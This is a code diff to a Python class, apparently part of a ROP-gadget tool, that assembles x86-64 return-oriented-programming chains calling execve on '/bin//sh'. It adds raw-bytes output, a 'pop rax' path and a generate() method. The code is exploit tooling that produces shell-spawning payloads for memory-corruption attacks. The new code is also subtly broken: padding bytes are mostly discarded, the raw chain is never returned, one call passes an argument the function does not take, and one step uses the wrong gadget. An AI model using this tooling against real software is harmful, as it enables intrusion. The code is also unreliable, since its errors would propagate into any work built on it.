@@ -12,14 +12,16 @@ import re
 
 
 class ROPMakerX64(object):
-    def __init__(self, binary, gadgets, liboffset=0x0):
+    def __init__(self, binary, gadgets, liboffset=0x0, rawoutput=False):
         self.__binary  = binary
         self.__gadgets = gadgets
 
         # If it's a library, we have the option to add an offset to the addresses
         self.__liboffset = liboffset
+        self.__rawoutput = rawoutput
 
-        self.__generate()
+        if not self.__rawoutput:
+            self.__generate()
 
     def __lookingForWrite4Where(self, gadgetsAlreadyTested):
         for gadget in self.__gadgets:
@@ -70,6 +72,21 @@ class ROPMakerX64(object):
                     print("\tp += pack('<Q', 0x%016x) # padding without overwrite %s" % (regAlreadSetted[reg], reg))
                 except KeyError:
                     print("\tp += pack('<Q', 0x4141414141414141) # padding")
+
+    def __padding_raw(self, gadget, regAlreadSetted):
+        int_to_bytes = lambda x: x.to_bytes(8, 'little')
+        padding = b''
+
+        lg = gadget["gadget"].split(" ; ")
+        for g in lg[1:]:
+            if g.split()[0] == "pop":
+                reg = g.split()[1]
+                try:
+                    padding += int_to_bytes(regAlreadSetted[reg])
+                except KeyError:
+                    padding += int_to_bytes(0x4141414141414141)
+        return padding
+    
 
     def __buildRopChain(self, write4where, popDst, popSrc, xorSrc, xorRax, incRax, popRdi, popRsi, popRdx, syscall):
 
@@ -180,8 +197,9 @@ class ROPMakerX64(object):
         addRax = self.__lookingForSomeThing("add rax, 1")
         addEax = self.__lookingForSomeThing("add eax, 1")
         addAx = self.__lookingForSomeThing("add al, 1")
+        popRax = self.__lookingForSomeThing("pop rax")
 
-        instr = [incRax, incEax, incAx, addRax, addEax, addAx]
+        instr = [incRax, incEax, incAx, addRax, addEax, addAx, popRax]
 
         if all(v is None for v in instr):
             print("\t[-] Can't find the 'inc rax' or 'add rax, 1' instruction")
@@ -218,4 +236,148 @@ class ROPMakerX64(object):
 
         print("\n- Step 5 -- Build the ROP chain\n")
 
-        self.__buildRopChain(write4where[0], popDst, popSrc, xorSrc, xorRax, incRax, popRdi, popRsi, popRdx, syscall)
+        self.__buildRopChain(write4where[0], popDst, popSrc, xorSrc, xorRax, incRax, popRdi, popRsi, popRdx, syscall, popRax)
+
+    def __buildRawRopChain(self, write4where, popDst, popSrc, xorSrc, xorRax, incRax, popRdi, popRsi, popRdx, syscall, popRax=None):
+        
+        sects = self.__binary.getDataSections()
+        dataAddr = None
+        for s in sects:
+            if s["name"] == ".data":
+                dataAddr = s["vaddr"] + self.__liboffset
+        if dataAddr is None:
+            print("\n[-] Error - Can't find a writable section")
+            return
+        
+        int_to_bytes = lambda x: x.to_bytes(8, 'little')
+        rawchain = b''
+
+        rawchain += int_to_bytes(popDst["vaddr"])
+        rawchain += int_to_bytes(dataAddr)
+        self.__padding_raw(popDst, {})
+
+        rawchain += int_to_bytes(popSrc["vaddr"])
+        rawchain += b'/bin//sh'
+        self.__padding_raw(popSrc, {popDst["gadget"].split()[1]: dataAddr})  # Don't overwrite reg dst
+
+        rawchain += int_to_bytes(write4where["vaddr"])
+        self.__padding_raw(write4where, {})
+
+        rawchain += int_to_bytes(popDst["vaddr"])
+        rawchain += int_to_bytes(dataAddr + 8)
+        self.__padding_raw(popDst, {})
+
+        rawchain += int_to_bytes(xorSrc["vaddr"])
+        self.__padding_raw(xorSrc, {})
+
+        rawchain += int_to_bytes(write4where["vaddr"])
+        self.__padding_raw(write4where, {})
+
+        rawchain += int_to_bytes(popRdi["vaddr"])
+        rawchain += int_to_bytes(dataAddr)
+        self.__padding_raw(popRdi, {})
+
+        rawchain += int_to_bytes(popRsi["vaddr"])
+        rawchain += int_to_bytes(dataAddr + 8)
+        self.__padding_raw(popRsi, {"rdi": dataAddr})
+
+        rawchain += int_to_bytes(popRdx["vaddr"])
+        rawchain += int_to_bytes(dataAddr + 8)
+        self.__padding_raw(popRdx, {"rdi": dataAddr, "rsi": dataAddr + 8})
+
+        rawchain += int_to_bytes(xorRax["vaddr"])
+        self.__padding_raw(popRdx, {"rdi": dataAddr, "rsi": dataAddr + 8, "rdx": dataAddr + 8})
+
+        if popRax:
+            rawchain += int_to_bytes(popRax["vaddr"])
+            rawchain += int_to_bytes(59)
+            rawchain += self.__padding_raw(popRax, {"rdi": dataAddr, "rsi": dataAddr + 8, "rdx": dataAddr + 8})  # Don't overwrite ebx and ecx
+        else:
+            for _ in range(59):
+                rawchain += int_to_bytes(incRax["vaddr"])
+                rawchain += self.__padding_raw(incRax, {"rdi": dataAddr, "rsi": dataAddr + 8, "rdx": dataAddr + 8})  # Don't overwrite ebx and ecx
+
+        rawchain += int_to_bytes(syscall["vaddr"])
+
+    def generate(self):
+        self.__gadgets.reverse()
+
+        # - Step 1 -- Write-what-where gadgets
+
+        gadgetsAlreadyTested = []
+        while True:
+            write4where = self.__lookingForWrite4Where(gadgetsAlreadyTested)
+            if not write4where:
+                print("\t[-] Can't find the 'mov dword ptr [r64], r64' gadget")
+                return
+
+            popDst = self.__lookingForSomeThing("pop %s" % write4where[1])
+            if not popDst:
+                print("\t[-] Can't find the 'pop %s' gadget. Try with another 'mov [reg], reg'\n" % write4where[1])
+                gadgetsAlreadyTested += [write4where[0]]
+                continue
+
+            popSrc = self.__lookingForSomeThing("pop %s" % write4where[2])
+            if not popSrc:
+                print("\t[-] Can't find the 'pop %s' gadget. Try with another 'mov [reg], reg'\n" % write4where[2])
+                gadgetsAlreadyTested += [write4where[0]]
+                continue
+
+            xorSrc = self.__lookingForSomeThing("xor %s, %s" % (write4where[2], write4where[2]))
+            if not xorSrc:
+                print("\t[-] Can't find the 'xor %s, %s' gadget. Try with another 'mov [r], r'\n" % (write4where[2], write4where[2]))
+                gadgetsAlreadyTested += [write4where[0]]
+                continue
+            else:
+                break
+
+        # - Step 2 -- Init syscall number gadgets
+
+        xorRax = self.__lookingForSomeThing("xor rax, rax")
+        if not xorRax:
+            print("\t[-] Can't find the 'xor rax, rax' instruction")
+            return
+
+        incRax = self.__lookingForSomeThing("inc eax")
+        incEax = self.__lookingForSomeThing("inc eax")
+        incAx = self.__lookingForSomeThing("inc al")
+        addRax = self.__lookingForSomeThing("add rax, 1")
+        addEax = self.__lookingForSomeThing("add eax, 1")
+        addAx = self.__lookingForSomeThing("add al, 1")
+        popRax = self.__lookingForSomeThing("pop rax")
+
+        instr = [incRax, incEax, incAx, addRax, addEax, addAx, popRax]
+
+        if all(v is None for v in instr):
+            print("\t[-] Can't find the 'inc rax' or 'add rax, 1' instruction")
+            return
+
+        for i in instr:
+            if i is not None:
+                incRax = i
+                break
+        
+        # - Step 3 -- Init syscall arguments gadgets
+        popRdi = self.__lookingForSomeThing("pop rdi")
+        if not popRdi:
+            print("\t[-] Can't find the 'pop rdi' instruction")
+            return
+
+        popRsi = self.__lookingForSomeThing("pop rsi")
+        if not popRsi:
+            print("\t[-] Can't find the 'pop rsi' instruction")
+            return
+
+        popRdx = self.__lookingForSomeThing("pop rdx")
+        if not popRdx:
+            print("\t[-] Can't find the 'pop rdx' instruction")
+            return
+
+        # - Step 4 -- Syscall gadget
+
+        syscall = self.__lookingForSomeThing("syscall")
+        if not syscall:
+            print("\t[-] Can't find the 'syscall' instruction")
+            return
+        
+        return self.__buildRawRopChain(write4where[0], popDst, popSrc, xorSrc, xorRax, incRax, popRdi, popRsi, popRdx, syscall, popRax)
